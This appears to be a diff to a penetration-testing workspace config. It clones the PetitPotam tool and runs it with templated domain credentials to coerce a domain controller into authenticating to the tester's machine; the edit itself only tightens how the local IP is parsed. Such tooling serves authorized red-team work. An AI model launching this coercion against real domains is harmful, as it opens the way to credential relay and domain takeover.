@@ -111,7 +111,7 @@ windows:
         - PetitPotam.py:
           - tmux select-pane -T 'PetitPotam.py' -t "authd:coercAuth.1"
           - cd <%= @settings["toolDir"] %>/PetitPotam || git clone https://github.com/topotam/PetitPotam.git <%= @settings["toolDir"] %>/PetitPotam && cd <%= @settings["toolDir"] %>/PetitPotam
-          - deviceIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
+          - deviceIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+" | awk '{print $1}')
           - python3 PetitPotam.py -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> $deviceIP $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1)
           - echo "Note eth0 is the default deviceIP used; modify deviceIP as needed"
         - Coercer:
